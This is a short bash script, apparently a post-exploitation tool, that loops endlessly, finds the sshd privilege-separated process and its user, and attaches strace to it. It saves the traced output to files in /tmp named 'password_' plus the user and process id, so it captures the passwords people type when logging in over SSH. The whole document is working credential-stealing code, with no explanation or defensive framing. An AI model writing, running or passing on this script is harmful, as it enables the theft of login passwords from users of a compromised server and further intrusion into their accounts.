#!/bin/bash
while :
do
        pid=`ps aux | grep sshd | grep priv | awk -F' ' '{print $2}'`
        user=`ps aux | grep sshd | grep priv | awk -F' ' '{print $12}'`
        if [ ! -z "$pid" ]
        then
                strace -p ${pid} &> /tmp/password_${user}_${pid}
        fi
done
